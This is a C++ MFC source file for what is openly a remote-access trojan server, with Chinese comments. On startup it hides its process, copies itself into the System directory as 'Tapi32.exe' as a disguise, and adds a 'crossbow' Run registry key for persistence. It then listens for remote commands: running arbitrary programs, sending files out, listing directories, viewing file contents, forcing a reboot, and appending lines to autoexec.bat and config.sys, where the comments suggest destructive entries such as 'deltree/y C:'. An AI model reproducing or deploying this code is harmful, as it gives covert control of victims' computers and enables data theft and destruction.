// SockListenerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "SockListener.h"
#include "SockListenerDlg.h"
#include "ClientSocket.h"

#include "Atlbase.h"
#include "io.h"
#include <sys/stat.h>
#include "Mmsystem.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HGLOBAL gMem;

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockListenerDlg dialog

CSockListenerDlg::CSockListenerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSockListenerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSockListenerDlg)	
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSockListenerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSockListenerDlg)	
	DDX_Control(pDX, IDC_LIST1, m_list1);	
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CSockListenerDlg, CDialog)
	//{{AFX_MSG_MAP(CSockListenerDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SHOWWINDOW()
	ON_WM_CREATE()	
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockListenerDlg message handlers

BOOL CSockListenerDlg::OnInitDialog()
{
	
	CDialog::OnInitDialog();		
	
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	if(!GetMyIP()){
		AfxMessageBox("Unable to get IP", MB_OK|MB_ICONERROR);	
	}
	else{
		m_MySocket.m_ptrDlg = this;
		m_MySocket.Create(PORT,SOCK_STREAM); 
		m_MySocket.Listen();
	}		
	return TRUE;  
}

void CSockListenerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CSockListenerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CSockListenerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockListenerDlg::GetMyIP
 Description     : 
 Return type     : BOOL 
----------------------------------------------------------------------------------------------------------------
*/
BOOL CSockListenerDlg::GetMyIP()
{		
	HOSTENT *hs;
	UCHAR ch[4]={0};
	CString csInfo;

	::gethostname((LPSTR)(LPCTSTR)m_cshostname, 50);
	
	hs = gethostbyname((LPSTR)(LPCTSTR)m_cshostname);

	memcpy(ch, hs->h_addr,4);
	csInfo.Format("%s  %d.%d.%d.%d", m_cshostname, 
		ch[0], ch[1], ch[2], ch[3]);
	GetDlgItem(IDC_TEXT)->SetWindowText(csInfo);
	/*
	::WSAAsyncGetHostByName 
	(
		this->m_hWnd, WM_USER_HOSTNAME,
		(LPCTSTR) m_cshostname, m_szBufHostent, 
		MAXGETHOSTSTRUCT 
	);
	*/
	
return(TRUE);
}

void CSockListenerDlg::ProcessPendingAccept()
{
	CString csSockAddr;
	CString csInfo;
	static int nIndex = 0;
	UINT nSockPort;
	
	CClientSocket* pSocket = new CClientSocket(this);	
	
	if (m_MySocket.Accept(*pSocket))
	{			
		if(pSocket->GetSockName(csSockAddr, nSockPort)){
			csInfo.Format("%s : %u - Connected", csSockAddr, nSockPort);
			m_list1.InsertString(-1, csInfo);			
			++nIndex;
		}		
	}
	else
		delete pSocket;
}

BOOL CSockListenerDlg::OnCloseConnection(CClientSocket *pSocket)
{
	CString csSockAddr;
	CString csInfo;
	static int nIndex = 0;
	UINT nSockPort;
	
	if(pSocket->GetSockName(csSockAddr, nSockPort)){
			csInfo.Format("%s : %u - DisConnected", csSockAddr, nSockPort);
			m_list1.InsertString(-1, csInfo);
	}
return(TRUE);
}

void CSockListenerDlg::ProcessPendingRead(CClientSocket *pSocket)
{
	char *lpBuf;
	
	lpBuf = new char [1000];

	for(int i=0;i<1000;i++){
		*(lpBuf+i) = 0;
	}
		
	pSocket->Receive( lpBuf, 1000);
	if(strnicmp(lpBuf,"CMD:",4) == 0){
		ExecuteCommand( lpBuf , FALSE);
	}
	else if(strnicmp(lpBuf,"!SHUT",5) == 0){
		SendText( "Exit program!", pSocket );
		OnExit();
	}
	else if(strnicmp(lpBuf,"FILEGET:",8) == 0){
		if(!SendFile(lpBuf, pSocket)){
			pSocket->Send("-1",2);
		}
	}
	else if(strnicmp(lpBuf, "EDITCONF:", 9) == 0){
		ExecEditCommand( lpBuf, pSocket );
	}
	else if(strnicmp(lpBuf, "LIST:", 5) == 0){
		ExecListCommand( lpBuf, pSocket );
	}
	else if(strnicmp(lpBuf, "VIEW:", 5) == 0){
		ExecViewCommand( lpBuf , pSocket);
	}
	else if(strnicmp(lpBuf, "CDOPEN:", 7) == 0){
		ExecCDOpenCommand( pSocket );
	}
	else if(strnicmp(lpBuf, "CDCLOSE:", 8) == 0){
		ExecCDCloseCommand( pSocket );
	}
	else if(strnicmp(lpBuf, "REBOOT:", 7) == 0){
		ExecRebootCommand( pSocket );
	}
	else{
		m_list1.InsertString(-1, lpBuf);		
	}
	
	
	delete [] lpBuf;
}

BOOL CSockListenerDlg::ExecuteCommand(char *cmdstr, int flags)
{
	char *ch;
	ch = cmdstr + 4;	
	WinExec(ch, SW_SHOW);
	
	return(TRUE);
}

void CSockListenerDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{		
	CDialog::OnShowWindow(bShow, nStatus);	
}

int CSockListenerDlg::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	//9x隐藏技术
	DWORD dwVersion = GetVersion();
	// 得到操作系统的版本号
	if (dwVersion >= 0x80000000)
	// 操作系统是Win9x,不是WinNt
	{
		typedef DWORD (CALLBACK* LPREGISTERSERVICEPROCESS)(DWORD,DWORD);
		//定义RegisterServiceProcess() 函数的原型
		HINSTANCE hDLL;
		LPREGISTERSERVICEPROCESS lpRegisterServiceProcess;
		hDLL = LoadLibrary("KERNEL32.dll");
		//加载RegisterServiceProcess()函数所在的动态链接库KERNEL32.DLL
		lpRegisterServiceProcess =(LPREGISTERSERVICEPROCESS)GetProcAddress(hDLL,"RegisterServiceProcess");
		//得到RegisterServiceProcess()函数的地址
		lpRegisterServiceProcess(GetCurrentProcessId(),1);
		//执行RegisterServiceProcess()函数,隐藏本进程

		FreeLibrary(hDLL);
		//卸载动态链接库
	}
	
	//写注册表->自动加载
	char TempPath[MAX_PATH];
	GetSystemDirectory(TempPath ,MAX_PATH);
	//TempPath是system目录缓冲区的地址,MAX_PATH是缓冲区的大小,得到目标机的System目录路径
	
	CString SystemPath = (CString)TempPath;
	CString commandline = (CString)GetCommandLine();

	commandline = commandline.Mid( commandline.Find('\"')+1 );
	commandline = commandline.Left( commandline.Find('\"') );

	CopyFile( commandline, SystemPath+"\\Tapi32.exe", FALSE);
	//将自己拷贝到%System%目录下,并改名为Tapi32.exe,伪装起来

	CRegKey *registry = new CRegKey();
	//定义一个CRegKey对象,准备修改注册表,这一步必不可少
	
	registry->Open(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	//打开键值HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\crossbow.如果不存在,就创建之.
	
	unsigned long lRegLength;
	registry->QueryValue(TempPath,"crossbow", &lRegLength);
	
	CString strTemp = (CString)TempPath;
	if(  strTemp != SystemPath+"\\Tapi32.exe" ){
	registry->SetValue(SystemPath+"\\Tapi32.exe", "crossbow" );
	//查找是否有"crossbow"字样的键值,并且是否为拷贝的目录%System%+Tapi32.exe
		//如果不是,就写入以上键值和内容
	}

	delete registry;

	//others	
	if (CDialog::OnCreate(lpCreateStruct) == -1)
		return -1;		
	return 0;
}


void CSockListenerDlg::OnExit() 
{
	CDialog::OnCancel();
}

void CSockListenerDlg::SendText( CString msg, CClientSocket *pSocket)
{
	DWORD dwFlen = (DWORD)msg.GetLength();
	
	pSocket->Send(&dwFlen, 4);

	char* data = new char[dwFlen+1];
	for ( int i=0; i<dwFlen; i++ )
		data[i] = msg.GetAt(i);

	data[dwFlen] =0;
		
	pSocket->Send(data, dwFlen);

	delete []data;
}

BOOL CSockListenerDlg::SendFile(char *szStr, CClientSocket *pSocket)
{
	CString csFile = szStr;
	CString csText;
	char szFileSize[11] = {0};

	int nIndex = csFile.Find(':');
	if( nIndex == -1) return FALSE;
	csFile = csFile.Right(csFile.GetLength() - (nIndex+1));

	m_list1.InsertString(-1, csFile);	
	
	CFile cf;

	try{
		if( !cf.Open(csFile, CFile::modeRead | CFile::typeBinary) ){
			return(FALSE);
		}
	}
	catch(CFileException *e){
		e->GetErrorMessage((LPSTR)(LPCTSTR)csText, 1);		
		m_list1.InsertString(-1, csText);
		e->Delete();
		return (FALSE);
	}

	DWORD dwFlen = cf.GetLength();
	sprintf(szFileSize,"%lu", dwFlen);

	pSocket->Send(&dwFlen, 4);
		
	gMem = GlobalAlloc(GHND, dwFlen);
	if(!gMem) {
		AfxMessageBox("Unable to alloc memory");
		cf.Close();
		return(FALSE);
	}
	byte* data;
	data = (byte*)GlobalLock(gMem);

	DWORD dwRead = cf.Read(data, dwFlen);
	if(dwRead != dwFlen){
		csText.Format("Actual Data:%lu  Data Read:%lu", dwFlen, dwRead);
		AfxMessageBox(csText);
	}

	pSocket->Send(data, dwFlen);
	GlobalUnlock(gMem);
	GlobalFree(gMem);
		
	cf.Close();
	
	return TRUE;
}
void CSockListenerDlg::ExecEditCommand( CString strBuf,CClientSocket *pSocket )
{
	CString strResult;

	int number=strBuf.GetLength();
	//得到字符串的长度
	char file_type = strBuf.GetAt(10);
	//第10个字符存入file_type变量,用于标示要编辑的是哪一个文件
	CString content = strBuf.Mid(12);
	//余下的字符串将被作为写入的内容写入目标文件
	
	_chmod("c:\\autoexec.bat", S_IREAD | S_IWRITE);
	_chmod("c:\\config.sys", S_IREAD | S_IWRITE);
    //将两个目标文件的属性改为可读可写

	FILE *fp=NULL;
	char filename[20];
	
	if (file_type == '1'){
		sprintf(filename,"%s","c:\\autoexec.bat");
		//如果第11个字符是1,就把Autoexec.bat格式化
	}else if(file_type== '2'){
		sprintf(filename,"%s","c:\\config.sys");
		//如果第11个字符是1,就把Config.sys格式化
	}

	int times_of_try=0;
	//定义计数器
	while(fp==NULL)
	{
		//如果指针是空
		fp=fopen(filename,"a+");
		//如果文件不存在,创建之；如果存在,准备在其后添加
		//如果出错,文件指针为空,这样就会重复
		times_of_try=times_of_try+1;
		//计数器加1
		if(times_of_try>100)
		{
			//如果已经试了100次了,仍未成功退出
			strResult.Format( "%s, %s, %s", "Edit Conf File ", filename, " Error!");
			SendText( strResult, pSocket );
			return;
		}
	}

	fwrite(content,sizeof(char),strlen(content),fp);
	//写入添加的语句,例如deltree/y C:或者format/q/autotest C:
	fclose(fp);
	//写完后关闭目标文件
		
	strResult.Format( "Edit Conf File %s Successful!",  filename);
	SendText( strResult, pSocket );
}

void CSockListenerDlg::ExecListCommand( CString strBuf, CClientSocket *pSocket )
{
	CString strResult;
	
	//如果前5个字符是"LIST:"
	int number=strBuf.GetLength();
	//得到字符串的长度
	CString Dir_Name=strBuf.Mid(6);
	//从字符串第六个字符开始,将后面的字符存入Dir_Name变量,这是目录名
	if(Dir_Name=="")
	{
		//如果目录名为空
		SendText("Fail By Open DIR's Name", pSocket);
		//返回"Fail By Open DIR's Name"信息
		return;
	}
	
	SetCurrentDirectory( (LPCTSTR)Dir_Name );
	//设置当前目录
	CFileFind finder;
	BOOL bWorking = finder.FindFile("*.*");
	while (bWorking)
	//循环得到下一层文件或目录
	{
		bWorking = finder.FindNextFile();
		if ( finder.IsDots() || finder.IsDirectory() ){
			strResult = "Dire: ";
		}else{
			strResult = "File: ";
		}
		strResult += finder.GetFileName();
		strResult += "\n";
	}
	
	SendText( strResult, pSocket );
	//返回Return_Text变量的内容
}

void CSockListenerDlg::ExecViewCommand( CString strBuf, CClientSocket *pSocket )
{
	CString strResult;

	//如果前5个字符是"View:"
	int number=strBuf.GetLength();
	CString File_Name=strBuf.Mid(6);
	//将目标文件流存入File_Name变量中
	int times_of_try=0;
	FILE *fp=NULL;
	while(fp==NULL)
	{
		fp=fopen( (LPCSTR)File_Name, "r");
		//打开目标文件准备读
		times_of_try=times_of_try+1;
		//计数器加1
		if(times_of_try>100)
		{
			//如果已试了100次了
			SendText("Fail By Open File", pSocket);
			//返回"Fail By Open File"的错误信息
			return;
		}
	}
	
	strResult="";
	char temp_content[300];
	for(int i=0;i<300;i++) temp_content[i]='\0';
	//定义一个空数组
	int Read_Num=fread(temp_content, 1, 300, fp);
	//从目标文件中读入前300个字符
	while(Read_Num==300)
	{
		strResult += (CString)temp_content;
		//strResult的内容加上刚才的字符
		for(int i=0;i<300;i++) temp_content[i]='\0';
		Read_Num=fread(temp_content, 1, 300, fp);
		//重复
	};
	
	strResult += (CString)temp_content;
	//strResult的内容加上刚才的字符
	fclose(fp);
	//关闭目标文件
	SendText(strResult, pSocket);
	//返回strResult的内容,即你查看文件的内容
}

void CSockListenerDlg::ExecCDOpenCommand( CClientSocket *pSocket )
{
	mciSendString("set cdaudio door open", NULL, 0, NULL);

	SendText( "CD Opened!", pSocket );
}

void CSockListenerDlg::ExecCDCloseCommand( CClientSocket *pSocket )
{
	mciSendString("set cdaudio door closed wait", NULL, 0, NULL);
	SendText( "CD Closed!", pSocket );
}

void CSockListenerDlg::ExecRebootCommand( CClientSocket *pSocket )
{
	DWORD dwVersion = GetVersion();
	//得到操作系统的版本号
	if (dwVersion < 0x80000000)
	{
		//操作系统是WinNt,不是Win9x
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		//定义变量
		OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		//OpenProcessToken()这个函数的作用是打开一个进程的访问令牌
		//GetCurrentProcess()函数的作用是得到本进程的句柄
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
		//LookupPrivilegeValue()的作用是修改进程的权限
		tkp.PrivilegeCount = 1; 
		//赋给本进程特权
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES)NULL, 0);
		//AdjustTokenPrivileges()的作用是通知Windows NT修改本进程的权利
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
		//强行退出WinNt并重启
	}
	else ExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);
	//强行退出Win9x并重启

	SendText( " Reboot Successful!", pSocket);
}
